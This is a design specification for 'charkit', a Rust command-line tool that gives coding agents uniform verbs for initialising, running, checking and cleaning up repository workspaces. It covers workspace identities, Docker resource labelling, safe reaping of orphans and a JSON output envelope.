# charkit — implementation plan

> **Status:** Phase 0 complete; phase 1 not started. This document is the complete
> specification — a fresh agent should be able to execute it without any prior conversation.
>
> **§0.1 and §0.2 are superseded by [`ARCHITECTURE.md`](ARCHITECTURE.md)**, which records what
> was actually decided. Everything else here stands.
>
> **Precedence: where this document and `ARCHITECTURE.md` disagree, `ARCHITECTURE.md` wins.**
> This is the specification of what to build; that is the record of what was decided about
> how. A conflict between them is a defect in one of them — fix it rather than picking a side
> silently, and say which document was wrong.
>
> **Binary name:** `char` · **Package name:** `charkit` (PyPI + npm, both verified free)
> **Language:** Rust (2021 edition) · **Platform:** POSIX only (macOS/Linux). Not Windows.

## Contents

| § | | Read it when |
|---|---|---|
| **1** | What this is | Once, for orientation |
| **2** | Core concepts — workspace, identities, ownership, reaping, child env | **Always.** Everything depends on it |
| **3** | The verb surface — verbs, `--json` envelope, `data.results[]`, selectors, scope lens | **Always** |
| **4** | Configuration — `char.yml`, `.char/`, `char.db`, templating, `commands:`, nested workspaces, `secrets:` | **Always.** §4.1 is the schema |
| **5** | Bootstrap: the three-layer sandwich | Only for the evidence scanner or `config verify` |
| **6** | Service drivers — compose, command, `owns:` | Only for `up` / `down` / `clean` |
| **7** | Non-goals | Before proposing a feature |
| **10** | Decisions made — do not relitigate. §10.1 is the language decision | Before arguing with one |
| 8, 9, 11, 12 | **Moved to [`PHASES.md`](PHASES.md)** — phases, fixtures, source material, risks | Your phase only |

**This document is the contract** — verbs, config schema, envelope, identities, drivers —
frozen once phase 1 lands. Sequencing lives in [`PHASES.md`](PHASES.md).

Companion documents, in precedence order — see `ARCHITECTURE.md` §2.8:
[`traps.md`](traps.md) (measured) › [`ARCHITECTURE.md`](ARCHITECTURE.md) (decided) ›
this file (specified) › [`PHASES.md`](PHASES.md) (sequenced) › [`AGENTS.md`](../AGENTS.md) (derived).

---

## 0. Start here

> **Phase 0 is complete.** It was a working session with the human and produced
> `ARCHITECTURE.md`, `AGENTS.md`, `traps.md` and the README's contributing section. The
> numbered steps below are kept as the record of what it did. **Start at [`PHASES.md`](PHASES.md), Phase 1.**

Read §2 (concepts), §4 (config) and [`PHASES.md`](PHASES.md) first — you need the shape of the thing to
have a useful conversation about how to build it. Then work through **Phase 0 — Foundations**
(in [`PHASES.md`](PHASES.md), and the numbered subsections 0.1–0.4 that live *inside* it) together:

1. Walk the human through the recommended architecture principles (0.1) and SDLC principles
   (0.2). Your job is to explain the *reasoning* and invite disagreement, not to collect
   agreement. A principle nobody argued with is usually one nobody read.
2. Get an answer to every question in 0.3. Those have no defensible default.
3. Write `docs/ARCHITECTURE.md`, `AGENTS.md`, and the README's contributing section.
   **Keep the rationale, not just the rules** — a rule without its reason gets discarded the
   first time it is inconvenient.
4. Stop. Phase 1 is a separate session.

Only then does building start — and phase 1 is still not the CLI. It is the repo skeleton
plus six fixture configs and their schema. Expect the schema to change while writing them;
that is the phase working, not a setback. Record which fixture forced which change, because
that record is the justification for keeping the fixture.

Four rules that hold for the whole project:

- **Phase 0 produces documents, not code.** If a source file appears, the phase went wrong.
- **Phase 1 must land alone.** Every later phase codes against the config contract it
  establishes. Parallel agents cannot share a decision that has not been made yet — they will
  each invent an answer and you will get three incompatible ones.
- **Only phase 3's *harvester* may read the Chariot repo** ([`PHASES.md`](PHASES.md) §9). If any other phase
  feels like it needs to look, the plan is underspecified — fix the plan, don't peek.
- **Do not relitigate §10.** Those decisions were made deliberately, with rationale recorded.

---

## 1. What this is

A CLI that gives coding agents one consistent vocabulary for managing a repo's tech stack,
so an agent working across several repos never has to re-derive how to start, check, or
clean up any of them.

It exists because five things go wrong in every repo, every day:

| # | Verb | The failure today |
|---|------|-------------------|
| 1 | Start the apps | Tilt here, `docker compose` there, a Procfile elsewhere. The agent guesses. |
| 2 | Run linters | Which tool, which scope, which fix flag, from which directory. |
| 3 | Run all tests | Including the ones needing services up, a browser, and a free port. |
| 4 | **Clean up after itself** | Nothing knows what a run created, so nothing can reliably destroy it. |
| 5 | **Initialize the code** | At the repo root *and* in a fresh worktree — deps, env, DB, non-colliding ports. |

**4 and 5 are the same bug**: you cannot clean up what you never claimed, and claiming
happens at init. That observation is the entire design.

### Evidence this is a real problem

From the source repo (`~/Development/chariot`), `scripts/char/worktrees.py:110` exists
because 29 leftover per-worktree Docker networks exhausted Docker's default bridge address
pool and broke Postgres startup for every subsequently allocated worktree — *"accumulated
exactly because nothing ever called this."* That is failure mode #4, already paid for once.

---

## 2. Core concepts

### 2.1 Workspace

**A workspace is one directory tree containing a `char.yml`, which gets its own runtime
state.** In practice: a checkout.

| Shape | Workspaces | Why |
|-------|-----------|-----|
| A repo, cloned once | 1 | One config, one port block, one `.char/` |
| A repo + 4 git worktrees | **5** | **The case that matters.** Same committed `char.yml`, five ids, five non-overlapping port blocks, five independent lifecycles. This is what lets five agents run concurrently on one machine. |
| A monorepo with 8 packages | 1 | Packages are *components* inside the workspace, not workspaces. **This is the default and should stay the default** — reach for §4.6 only when packages are genuinely separate products |
| A monorepo declaring nested workspaces (§4.6) | 1 + one per declaration | The exception: `apps/foo` and `apps/bar` are separate products that happen to share a repo and need independent lifecycles |
| Two separate `git clone`s | 2 | Separate `.git`, genuinely independent |

**How the workspace root is found.** Every verb resolves it the same way, and the answer must
be identical from anywhere inside the tree, because `workspace_id` is a hash of it:

> Walk up from the caller's cwd to the git root, collecting **every** `char.yml` found.
>
> - **Exactly one** → that directory is the workspace root.
> - **Zero** → `bad_config`, naming the directories searched — *but only for verbs that need
>   a workspace; see below.*
> - **Two or more** → `bad_config`, *unless* the outer one declares the inner in
>   `workspaces:` (§4.6). If it does, the innermost wins.

**Not every verb needs a workspace.** The rule is: *asking about this workspace requires a
`char.yml`; asking about the machine does not.*

| Requires a `char.yml` | Runs without one |
|---|---|
| `init` `up` `down` `check` `clean` `status` `config verify` `agents-md` | `char config scan` (§5 layer 1 — it exists to run *before* a config does) |
| | `char status --all` |
| | `char clean --all --orphaned` |

The machine-scoped cases matter more than they look. `clean --orphaned` is most needed from
*outside* any workspace — from a shell that happens to be anywhere — and nothing else on the
machine reaps orphaned ports and containers. A rule that made it resolve a local workspace
first would fail before it could do the one job only it does.

Anchoring on `char.yml` rather than always the git root, because the two differ in exactly
the cases that matter: in a monorepo a package may sit far below the root, and the git root
of a worktree is the worktree itself. One rule covers both. Stopping at the git root keeps a
stray `char.yml` in a parent directory from capturing an unrelated repo — and means a git
submodule, which has its own git root, is correctly its own workspace for free.

Collecting *all* of them rather than taking the nearest is what makes an accidental nested
`char.yml` fail loudly instead of silently creating a second owner for the same source. The
walk is bounded by directory depth, so it costs nothing.

Do **not** rename this concept. "Workspace" already means roughly this in VS Code,
Terraform, cargo and pnpm, so an agent arrives knowing it. Inventing vocabulary works
directly against the project's thesis that an agent learns this once. (If the overload with
pnpm/npm workspaces ever genuinely bites, the fix is `checkout`, not an invented word.)

### 2.2 Two derived identities

Distinct newtypes, not two `String` aliases — both are 8 hex characters, and passing one where
the other belongs must not compile:

```rust
pub struct WorkspaceId(String);
pub struct ProjectId(String);
```

```text
workspace_id = sha1(realpath(workspace_root))[..8]
project_id   = sha1(realpath(`git rev-parse --path-format=absolute --git-common-dir`))[..8]
```

> **`--path-format=absolute` is load-bearing, and `realpath` alone is not enough.** Plain
> `git rev-parse --git-common-dir` returns a path *relative to cwd* — `.git` from the repo
> root, `../.git` from a subdirectory — so hashing it directly yields a different project id
> depending on where the command ran. Applying `realpath` looks like a fix and is not: it
> resolves against **the calling process's** cwd, while §1.4 of `ARCHITECTURE.md` forbids
> reading cwd below the entrypoint, so char runs git with `current_dir(workspace_root)` and
> then resolves `../.git` against its own cwd. Wrong id, silently. Measured: with
> `--path-format=absolute` (git ≥ 2.31) the answer is identical from every directory, and
> `realpath` remains only to resolve symlinks. **Subtler than it looks — from inside a
> worktree the plain form already returns an absolute path, so this fails only in a
> subdirectory of the main checkout.** It silently breaks `--project` scoping, the
> database's project filter, and the guarantee that worktrees group with their parent. Verify
> this behaviour before changing the line; it is not obvious from the command's name.

Known and accepted: because the id derives from a path inside the parent checkout, moving or
deleting that checkout regroups every surviving worktree. It only affects the grouping key,
which owns nothing (below), and it is recoverable by recomputation.

- **workspace id** — owns ports, containers, networks, processes, locks. One per checkout.
- **project id** — owns nothing. Purely the grouping key: every worktree shares one
  `--git-common-dir` with the checkout it came from.

Both are *derived*, never stored as truth, so they survive a deleted `.char/` and can be
recomputed by anything. `realpath` matters — symlinked checkouts must not get two identities.

**Workspaces in a project are siblings, not parent and children.** The root checkout is
just another workspace with no authority over the worktrees. This is load-bearing: model it
as a hierarchy and `char clean` in the root implies cascading into the worktrees, killing
services another agent is actively using. Flat siblings plus an explicit `--project` flag
makes the destructive step something you have to ask for.

### 2.3 Ownership

Every port, container, network, **volume**, **image** and process char creates is stamped
with the workspace id. That single fact is what makes `clean` correct, and it is the highest-value
primitive in the project.

- Containers/networks/**volumes**/images: **two** labels, `char.workspace=<id>` and
  `char.workspace_path=<realpath>` — see §2.3.1 for why the second one is not redundant.
  **Networks and volumes must be stamped separately from services**, because compose does not
  propagate a service's labels to the network or the named volumes it creates from the same
  document — measured, and it is the founding bug of this project reappearing inside its own
  design (`traps.md`). Volumes were absent from this vocabulary entirely until a review found
  it; a named volume outlives `down`, outlives the container, and is invisible to every filter
  char would use to find it.
- Processes: tracked process-group id, spawned in a new session via `setsid` (see
  [`traps.md`](traps.md) — **not** `process_group(0)`, which conflicts with it), killed with
  `killpg`. **Recorded in `~/.char/char.db` (§4.3), not in the workspace** — a pgid
  recorded inside a directory that gets deleted is a leaked process
- Ports: claimed blocks in `~/.char/char.db`, released on `clean`

### 2.3.1 Reaping happens automatically, at `char init`

**The plan's one piece of empirical evidence is a sweep function that existed and was never
called.** An earlier draft answered that with `char clean --orphaned` — a manual, opt-in flag
on a verb nobody runs in a workspace they are not in. That is the same bug with a new name.

So `char init` reaps first, then claims:

1. **Registry pass.** Drop `workspaces` rows whose `path` no longer exists, releasing their
   port blocks and `owned` rows.
2. **Resource pass.** Find every resource labelled `char.workspace=*`, read its
   `char.workspace_path` label, and **`stat` that path. Remove only on `ENOENT`.**

   **Any other errno means "adopt or report", never remove.** Measured: `stat` on a *live*
   directory under a mode-000 parent returns `EACCES`, which is byte-identical in failure to a
   missing path. That is exactly the multi-user and devcontainer case this label was added for
   — `$HOME` is 0700 on Linux — so a naive "stat failed → gone" reintroduces the bug the label
   exists to prevent.
3. **Lease pass.** Delete leases whose heartbeat has gone cold (§4.3).

**Why pass 2 reads a path label rather than checking the database.** An earlier draft removed
any resource whose id had no row, claiming this "does not depend on the record being intact —
the label is enough." That is backwards, and dangerously so. `workspace_id` is
`sha1(realpath(path))[..8]` — a **one-way hash** — so from a label alone char cannot recover
the path and cannot ask whether that workspace still exists. The only way to answer was to
consult the database, which makes **a missing row indistinguishable from a dead workspace.**

The database is per-`$HOME`; the Docker daemon is per-machine. So every one of these deleted a
*running* workspace's containers:

| Situation | Result under the old rule |
|---|---|
| A second user account on the same machine | Their running stack removed |
| A devcontainer or CI user with its own `$HOME` | Same |
| `char.db` deleted, corrupted, or on a synced home directory | **Your own** running stack removed |

That is §2.2's flat-siblings guarantee — `clean` must never cascade into a workspace another
agent is using — reintroduced by the very mechanism added to fix the plan's motivating bug.

**`clean` filters on both labels, not the id alone.** `workspace_id` is 32 bits, and every
`owns:` selector in §6.1 is id-only — so a collision would have `char clean` in one workspace
destroy another's live containers, the single thing §2.2's flat-siblings model exists to
prevent. The path label already exists; using it costs nothing and closes it.

Stamping the path makes pass 2 **self-sufficient**: it stats a real directory and consults
nothing. "Labelled, no row, but the path exists" is now **adopt or report, never remove.**

Two costs, accepted: one extra label per resource, and the workspace path becomes visible in
`docker inspect` to anyone on the machine. Hashing the path instead would hide it but destroy
the only property that matters — you cannot `stat` a hash.

**This is why the label vocabulary had to be settled before phase 1.** It is stamped into
every resource char ever creates; changing it later leaves everything created beforehand
unreapable by the new logic, which is precisely the orphan class the tool exists to prevent.

`init` is the right hook for three reasons: it is where the outage actually originated
(repeated worktree create/destroy always runs `init` in the new one), it already holds the
database open to claim a port block, and it is infrequent enough that a docker call costs
nothing noticeable.

**`clean` has a fixed order, because a SIGKILL part-way through must not make things worse.**
Kill the process group and remove labelled resources **before** deleting any row: a row deleted
first leaves a live process with no record, which is the unreclaimable state this whole section
exists to prevent, while a resource removed first leaves a stale row that the next `init` reaps
for free. Ordering is cheap and the asymmetry is total — one direction degrades to a leak, the
other to a no-op.

```
1. leases      release this workspace's (so nothing new starts)
2. processes   killpg TERM -> grace -> KILL, confirm gone
3. docker      containers, then networks and volumes, then built images
4. ports       release the block
5. rows        delete owned/workspaces rows
6. .char/      remove the directory
```

**Reaping is reported, never silent** — in human output and under `data.reaped` in `--json`.
A tool that removes containers without saying so is worse than one that does not remove them.

`char clean --orphaned` remains, for reaping without initialising anything.

**A run whose workspace is deleted under it must notice, because every symptom is
misleading.** Measured: writes to an already-open log fd **succeed silently** into an unlinked
inode, opening a new file gives `ENOENT`, `getcwd()` gives `ENOENT`, and spawning a child gives
rc 128 with `fatal: Unable to read current working directory`. So the run continues, its logs
go nowhere, and every remaining check reports `tool_failed` with an opaque git error rather
than the actual cause. char stats the workspace root before each check dispatch — one syscall —
and on `ENOENT` ends the run `ABORTED` with class `environment` naming the deleted path. Also
measured: `git worktree remove` succeeds with no `--force` and no complaint while a process is
running inside it, so the deletion vector this project is built around is entirely silent.

**A process whose workspace was deleted is reclaimable, given `boot_id` and `pid_started_at`
(§4.3).** The naive version cannot distinguish "pgid 4212 is my orphaned service" from "pgid
4212 was recycled by the OS", so it can only report. Recording the boot id and the process
start time alongside the pgid makes recycling detectable: same boot, same start time, it is
ours and `killpg` is safe; anything else is stale and the row is dropped. Without them every
pgid row survives a reboot as a permanent phantom leak in `status --all`.

**Pass 1 removes a `workspaces` row only on `ENOENT`, exactly like pass 2.** The rule was
stated for pass 2 and left implicit for pass 1, which is the same defect in the cheaper half: a
live workspace on a network mount that is momentarily unavailable answers `EACCES` or `EIO`,
and dropping its row releases a port block it is still using.

**Images are here because leaving them out makes `clean` wrong at the largest scale.** The
source repo already sweeps orphaned images and records roughly 2.1 GB per production app
build — the single biggest thing a stale workspace holds.

**But only images char causes to be *built*.** A pulled image such as `postgres:16` is shared
with everything else on the machine and was never char's to remove. Built images are stamped
through `build.labels` in the compose document char generates (§6.0). An earlier draft said
stamping meant "passing the label through to compose" — `docker compose` has no `--label`
flag, so that was wrong; the label reaches the image through the generated document instead.

### 2.4 What every child process inherits

char sets two variables in the environment of every process it spawns — services, checks and
`commands:` entries alike. Neither is declared anywhere; both are always present:

```
CHAR_WORKSPACE=a3f91c02       this workspace's id
CHAR_RUN_ID=<run-id>          the run this process belongs to, when inside one
```

`CHAR_RUN_ID` exists so a nested invocation can *join* the outer run rather than starting a
second one — a child that finds it set knows it is already inside a run and inherits its
lock rather than contending for it. The source repo already does exactly this with
`CHAR_CHECK_RUN_ID`, including reading it back to detect nesting, so this is a confirmed
requirement rather than a guess.

Automatic rather than a substitution: it needs no declaration, nothing to typo, and it works
for a script char has never been told anything about.

---

## 3. The verb surface

Six verbs, identical in every repo. This is the entire surface an agent memorizes;
everything else is config. **Every verb takes `--json`.**

| Verb | Contract | Terminal states |
|------|----------|-----------------|
| `char init` | Workspace ready: run each component's setup, claim a port block, write `.char/`. Idempotent **in char's own state** — see §4.1. | `READY` `FAILED` |
| `char up` | Services running and ready-checked. Records what it started as `owned` rows in `~/.char/char.db` (§4.3). | `UP` `PARTIAL` `FAILED` `TIMEOUT` |
| `char down` | Services stopped. Port block **kept** — still your workspace. | `DOWN` `PARTIAL` `FAILED` |
| `char check` | Lint / format / test. Scoped, scheduled, leased, ceilinged. `--detach` / `--status` / `--wait` / `--fix` / `--files` / `--jobs`. | `PASS` `SKIPPED` `FAILED` `ABORTED` `DEAD` `TIMEOUT` |
| `char clean` | Release everything this workspace owns — ports, containers, networks, images, leases — and remove `.char/`. Declared `release:` commands are **reported, never run** (§6.1). Build artifacts only with `--artifacts` (§6.1). | `CLEAN` `PARTIAL` `FAILED` |
| `char status` | What's running, what's mine, what's stale, what a run is doing now. | `OK` `FAILED` |

Plus: `char config scan`, `char config verify`, `char agents-md [--write|--verify]`, and any
repo-local verbs the repo declares in `commands:` (§4.5) — which char dispatches but does not
define.

**`char init` means exactly one thing: make this workspace ready.** An earlier draft also
assigned it §5's layer-1 evidence scan, which by definition runs where no `char.yml` exists —
so that verb had two unrelated behaviours, two output shapes, and could only fail in the
state half of it existed to serve. The scan is `char config scan`, which puts layers 1 and 3
of the bootstrap sandwich in one namespace: **scan** produces evidence, an agent authors,
**verify** checks the result.

**One spelling for failure: `FAILED`.** An earlier draft used `FAIL` for `check` and `FAILED`
for `init` / `up` — two tokens for one idea, in the one place the project claims six verbs
behave identically. The complete enum:

```
TERMINAL — every one maps to an exit code (ARCHITECTURE.md §1.6)

  READY  UP  DOWN  CLEAN  PASS  OK         success
  SKIPPED                                  nothing to do; exit 0, not PARTIAL
  PARTIAL                                  some succeeded, some did not
  FAILED                                   did not achieve its goal
  ABORTED  DEAD  TIMEOUT                   did not finish

PROGRESS — a run in flight; never terminal, never mapped to an exit code

  RUNNING                                  executing
  WAITING                                  not executing; `waiting_on` says why
```

### 3.1 The `--json` envelope

**Fixed in phase 1, alongside the config contract, and for the same reason.** Four things
consume it — the MCP server (phase 5), the dogfood test (phase 3), agents, and the golden
snapshots — and none of them can invent it independently without the three incompatible
answers [`PHASES.md`](PHASES.md) §8 warns about.

```json
{ "schema_version": 1,
  "verb":           "check",
  "workspace":      "a3f91c02",
  "status":         "FAILED",
  "error":          null,
  "data":           { "runs": [] } }
```

| Field | Meaning |
|---|---|
| `schema_version` | One global version for the whole CLI contract. Adding a field does not bump; removing one or changing its type does. |
| `verb` | Which verb produced this |
| `workspace` | **Always the invoking workspace**, even under `--project` / `--all`. Other workspaces appear inside `data`, so the envelope shape never varies. |
| `status` | The terminal state from the table above |
| `error` | The typed error object (§1.7 of `ARCHITECTURE.md`) or `null` |
| `data` | The per-verb body. **Defined by the phase that builds the verb**, not here. |

The body is nested rather than flattened so the envelope is generically validatable — one
schema checks the wrapper, a per-verb schema checks `data` — and so a future verb can add a
field called `status` or `error` without colliding with the envelope.

#### `data.results[]` — because every verb is plural

**Fixed in phase 1 with the envelope, for the same reason.** An earlier draft left `data`
"defined by the phase that builds the verb", which meant the most common question after a
failure — *which check failed, why, and where is its output* — had no specified answer on the
verb agents call most. The argument that fixed the envelope applies verbatim here.

Every verb acts on many things: `check` runs N checks, `up` starts N services, `clean --all`
touches N workspaces. So they share one array shape, learned once:

```json
{ "schema_version": 1, "verb": "check", "workspace": "a3f91c02",
  "status": "FAILED",
  "error": { "class": "tool_failed", "where": "api:lint",
             "message": "2 of 4 checks did not pass" },
  "data": {
    "run_id": "01J8X2",
    "results": [
      { "id": "web:lint", "status": "PASS",    "duration_ms": 840,
        "log": ".char/run/01J8X2/logs/web.lint.log" },
      { "id": "api:lint", "status": "FAILED",  "duration_ms": 3120,
        "log": ".char/run/01J8X2/logs/api.lint.log",
        "error": { "class": "tool_failed", "message": "ruff: 7 errors" } },
      { "id": "web:e2e",  "status": "TIMEOUT", "duration_ms": 900000,
        "error": { "class": "timeout", "message": "exceeded timeout: 900s" } },
      { "id": "api:test", "status": "ABORTED", "duration_ms": 0 }
    ],
    "skipped": 0 } }
```

**The top-level `error` is the aggregate**, chosen by a fixed precedence so two implementations
cannot disagree:

```
char_bug  >  environment  >  bad_config  >  timeout  >  aborted  >  tool_failed
```

`environment` sits second because it invalidates everything below it: when Docker is down or
the disk is full, the four failures underneath are consequences, and reporting one of them
sends the caller to fix a repo that is fine.

**`where` has two grammars, and the class picks which.** For `bad_config` it is a path into
the config — `char.yml:components.api.checks.lint.cmd` — because the actionable thing is the
line to edit. For every other class it is the id from `results[]` — `api:lint` — because the
actionable thing is the check. An agent can tell them apart by the `char.yml:` prefix, and
does not need to: `next_action` is required for `bad_config` and says what to do.

**`PARTIAL` joins the terminal states** for the case where some succeeded and some did not.
It earns its place on `clean --all` and `up`, where "three of five worked" and "nothing
worked" demand different actions and would otherwise both read `FAILED`.

**`check` never reports `PARTIAL`.** One failing check fails the run — that is what a merge
gate needs, and "three of five passed" is not a different action from "none passed" when the
action is *fix the failing one*. `results[]` itemises exactly which, so nothing is lost by
saying it once at the top. A whole run where every selected check was `SKIPPED` reports
`SKIPPED`, not `PASS`: nothing ran, and claiming approval for that is the failure mode §4.1's
empty-`${files}` rule exists to prevent.

#### `RUNNING` and `WAITING` are progress, not verdicts

An earlier draft listed `BLOCKED` among the *terminal* states, which broke the exit-code rule:
`exit = f(error.class)` with no class yields **0**, so a run that acquired nothing and did
nothing would report success — in a merge gate. It also read as a fault, when the ordinary case
is simply waiting a turn.

**A run never ends `RUNNING` or `WAITING`.** It acquires and produces a real verdict, or the
acquisition ceiling expires and it ends `FAILED` with class `aborted` — retryable, because the
actionable fact is that the machine was busy rather than that this check is slow.

These two also fill a gap `--detach` had: every other state is terminal, so a detached run had
nothing correct to report to `char check --status` while it was still going.

**Captured output is capped at 10 MB per check, head and tail retained with the middle
elided.** `run_retention` is a count of runs, not a size, so nothing bounded a single run: a
`commands:` entry writing gigabytes to stdout under `stdio: pipe` fills the disk with char
faithfully copying every byte, and the disk-full failure then lands on the state store. The
cap is stated in `results[].log` when it trips, so a truncated log never reads as a complete
one.

**`--status` is the one place the envelope's top-level `status` may be a progress state.**
Everywhere else it is terminal by definition (§3.1). The exception is confined to one flag,
because a query about a run reports the run's state, and `RUNNING` is the true answer.

**`--status` exits on the success of the query, not on the verdict of the run.** An in-flight
run answers `status: RUNNING`, exit **0** — the query worked. This is the one place where exit
0 does not mean "the thing you asked about is fine", so it is stated rather than left to be
discovered: **a gate must use `--wait`, never `--status`.** `--status` is for a human or an
agent polling; `--wait` blocks and exits on the run's real class. Exit codes from `--status`
are about the query — `2` for an unknown run id, `3` if the config no longer parses.

**`results[].id` is a different grammar per verb, and that is intended.** It is a check id
for `check`, a component name for `init`/`up`/`down`, a workspace id for `clean --all`. One
field, because the *shape* is what an agent learns once — iterate `results[]`, read `status`,
read `error` — and the id is opaque to that loop. It is only ever compared against ids from
the same verb's payload.

**`waiting_on` carries the distinction that matters** — whether the cause is inside this
workspace or outside it:

```json
{ "id": "api:test",  "status": "WAITING",
  "waiting_on": { "cpu_slot": 4, "available": 2 } }

{ "id": "web:e2e",   "status": "WAITING",
  "waiting_on": { "exclusive": "browser", "held_by": "7c21ab90", "since_ms": 44000 } }
```

The first is this run's own budget and will clear on its own. The second names **another
workspace** as the reason, which is the thing an agent cannot work out for itself and the only
useful answer to "why has this taken fifteen minutes."''

#### Ports: `port_block` is the workspace's; assignments are the component's

```json
"data": {
  "port_block": { "from": 5460, "to": 5469, "claimed_at": "2026-08-09T14:02:11Z" },
  "results": [
    { "id": "postgres", "status": "UP",
      "ports": { "pg":  { "port": 5460, "state": "LISTENING" } } },
    { "id": "api", "status": "FAILED",
      "ports": { "api": { "port": 5461, "state": "CONFLICT" } },
      "error": { "class": "tool_failed",
                 "message": "port 5461 held by a process char did not start" } } ] }
```

`port_block` carries **only what char actually knows and owns**: the span reserved for this
workspace and when it was reserved. Not a count of assignments — that is derivable from
`results[]` and duplicating it invites drift. Not a count of free ports — char cannot know
that without probing every unassigned port, and the answer would be stale on emission. Naming
them `from` and `to` rather than a two-element array removes the "span or list?" ambiguity.

**Port state is probed at report time, never remembered.** A claim recorded at `init` says
nothing about what is bound days later, and the bindability probe has a measured blind spot:
**an IPv6-only listener is invisible to an IPv4 probe**, and `localhost` resolving to `::1` is
what modern Node does. So char probes **both** `127.0.0.1` and `[::1]` and treats either
`EADDRINUSE` as taken. `SO_REUSEPORT` on both sides remains undetectable and is a stated limit,
not a bug. An earlier draft named `SO_REUSEADDR` as the defeating case and cited
[`traps.md`](traps.md) for a measurement that was not there; `SO_REUSEADDR` does not defeat it. `CONFLICT` is the only way a port taken by a
non-char process reaches a caller instead of surfacing as a mysterious bind failure. It costs
one `connect()` per declared port.

| State | Meaning |
|---|---|
| `RESERVED` | assigned to a component, nothing bound — expected after `init` or `down` |
| `LISTENING` | bound, by the service char started |
| `CONFLICT` | bound by something char did not start |

**`init`, `up`, `down` and `status` all emit `results[]`** — `init`'s are components, the rest
are services. That is what lets the two states with ports but no running services (`init`, and
`down` which keeps the block) report them without a second, duplicate top-level map.

### 3.2 Selectors

Check ids are derived as `<component>:<check>` (§4.1), so char always holds the complete set
of valid selectors and never has to discover anything. `char check web:e2e`,
`char check --component web` and `char check lint` all fall out of that set.

**A bare positional accepts four things, disambiguated by characters the name grammar
forbids** (§4.1: names match `^[a-z0-9][a-z0-9_-]*$`, so they contain no `:`, `/` or `.`):

```
char check api                        component, or a check name
char check lint                       check name across every component
char check api:lint                   a check id                        (has `:`)
char check backend/api/views.py       a path                            (has `/` or `.`)
char check backend/tests/             a path — directory
char check --files a.py b.py          an explicit list
```

**A path selector runs the checks whose `match:` covers those files, with `${files}` set to
exactly them.** That is the case an agent actually has — it changed one file and wants that
file checked — and it is what stops the bypass: without it, an agent reasons that running the
underlying tool directly is faster, and it is right. `char check <one file>` must be at least
as fast as running the tool by hand, or agents will run the tool by hand and char stops being
the vocabulary the project exists to provide.

**A bare word that matches both a component and a check name is `bad_invocation`**, naming both
and telling the caller to disambiguate with `--component`. Rare, and better than picking one
silently.

**Partial matches are normal.** `char check test` where `api:test` exists and `web:test` does
not runs `api:test` and exits 0.

**Zero matches depend on whether the name is conventional.** These four are conventional:

```
lint   types   test   e2e
```

They are exactly the check names §4.1's example config uses, and nothing more. An earlier
draft listed six, adding `build` and `fmt`, and justified the set with *"all six fixtures
already use exactly these names"* — a claim about artifacts that do not exist yet, and one
that also broke the growth rule stated below. `build` and `fmt` join the set the first time a
fixture actually declares them.

- **A conventional name matching nothing** → `PASS`, empty `data.results[]`, exit 0. "This
  workspace has no lint checks" is a real and unremarkable answer, and it is what lets an
  orchestrating agent run `char check lint` across five workspaces without special-casing
  the three that lack it.
- **An unconventional name matching nothing** → `bad_invocation`, exit 2, with the available
  selectors listed in `next_action`. Almost always a typo, and the error teaches the
  vocabulary rather than merely rejecting.

**Why char holds this small piece of policy.** Without it, "you typed it wrong" and "this
repo has none" are indistinguishable, and both available answers are bad: exiting 0 on a typo
means an agent reports a passing lint that never ran, while erroring on both teaches agents
to write `char check lint || true` — which suppresses *every* error the command can raise,
converting a local annoyance into a total loss of signal. The set is drawn from §4.1's example
config and nothing else; the fixtures do not exist yet and cannot justify anything.

**Growth rule: a name joins the set only when a fixture uses it.** Otherwise the list becomes
a bikeshed.

**`--fix` runs `fix:` instead of `cmd:`** for every selected check that declares one, and
skips those that do not. `fix:` was a config key with no flag to invoke it.

### 3.2.1 One run at a time, per workspace

A `char check` holds a **run lease** (§4.3) for its workspace. A second, non-nested `char
check` **fails fast** rather than blocking:

```
error: a run is already in flight
  run 01J8X2, pid 4212, started 3m ago
class: bad_invocation                  exit 2
next_action: `char check --wait` to queue, or `char check --status` to watch it
```

Blocking by default would mean an agent expecting a quick lint silently waiting out a
fifteen-minute test suite with no output. Failing fast gives it something to act on;
`--wait` is there when queueing is what you meant.

**Nested runs join rather than contend — but only within the same workspace.** A child that
finds `CHAR_RUN_ID` set (§2.4) joins the outer run and inherits its lease **if and only if
`CHAR_WORKSPACE` equals the workspace it just resolved**. Otherwise it clears both variables and
starts an independent run.

That condition is load-bearing. §4.5 inherits the parent environment *wholesale*, so both
variables reach every child — including a `char check` invoked in a **different** workspace: a
nested workspace (§4.6), a `commands:` script that changes directory, a monorepo
sub-invocation. Without the workspace check such a child skips its own lease and reports the
parent's id, which allows two concurrent runs in one workspace — the exact thing this section
exists to prevent, failing only under nesting and therefore only rarely and
nondeterministically.

### 3.2.2 The envelope on error paths

The envelope shape never varies (§3.1), but two fields need stating for the case where char
failed before it could establish context:

- **`workspace` is `null`** when workspace resolution is what failed — a `bad_config` for a
  missing `char.yml`, or any machine-scoped invocation run from outside a workspace (§2.1).
  A consumer must tolerate it; it cannot be "always the invoking workspace" when there isn't
  one.
- **`status` is `FAILED`** whenever `error` is non-null and no more specific terminal state
  applies. That includes `char status`, whose only success state is `OK` and which otherwise
  had no way to report that it failed.

### 3.3 Scope lens

`status` and `clean` are the two verbs where "just me" isn't always right. Same flag on both.

| Scope | Covers | Answers |
|-------|--------|---------|
| *(no flag)* | this checkout | "Are my services up? Is a run in flight? What ports do I hold?" |
| `--project` | every workspace sharing this `--git-common-dir` | "What's going on across everything I have open on this repo?" — the orchestrating agent's view |
| `--all` | every workspace on the machine | "What is char holding anywhere?" |

### 3.3.1 `--dry-run`

**`char init`, `char up`, `char down`, `char check` and `char clean` all take `--dry-run`.** It
returns the ordinary envelope with `data.would_*` in place of `data.results[]`, and changes
nothing:

```
char clean --dry-run --artifacts --all
  would_release   ports 5460-5469 (a3f91c02), 5470-5479 (7c21ab90)
  would_remove    4 containers, 3 networks, 2 images
  would_delete    node_modules, .venv            (--artifacts)
  would_report    1 external resource char does not reclaim (§6.1)
```

**char computes this from its own state and needs no help from the repo.** It knows what it
claimed, what it labelled, and what the current scope selects. `clean --artifacts --all` is the
case that most needs it — it deletes every declared `owns.files` on the machine and previously
had no preview at all.

**`commands:` entries take no `--dry-run`.** §4.5 passes remaining argv through **untouched**,
and its own example is `char worktrees prune --dry-run` reaching the script unchanged — so a
`dry_run:` key would have char intercept a flag that belongs to the child. A dispatched
command's flags are the child's; `--dry-run` applies to the five verbs char owns.

Two filters compose with any scope, on `clean`:

- **`--orphaned`** — always safe. It only touches workspaces whose directory no longer exists,
  so it can never disturb a live agent.
